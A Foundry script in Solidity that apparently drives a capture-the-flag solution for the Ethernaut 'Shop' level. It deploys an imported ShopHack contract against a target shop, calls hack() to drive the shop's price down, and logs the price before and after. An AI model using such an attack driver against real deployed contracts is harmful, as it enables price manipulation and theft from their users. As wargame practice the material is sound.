// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {ShopHack} from "src/hack/ShopHack.sol";

interface IShop {
    function price() external view returns (uint256);
}

contract ShopScript is Script {
    function run() external {
        address shopAddress = vm.envAddress("SHOP_ADDRESS");
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        vm.startBroadcast(attacker);

        console2.log("Code ", (vm.getDeployedCode("Shop.sol:Shop")).length);
        console2.log("Price Before Hack : ", IShop(shopAddress).price());

        ShopHack shopHack = new ShopHack(shopAddress);
        shopHack.hack();

        console2.log("Price After Hack : ", IShop(shopAddress).price());

        vm.stopBroadcast();

        console2.log("SUCCESS!!! Submit the instance.");
    }
}
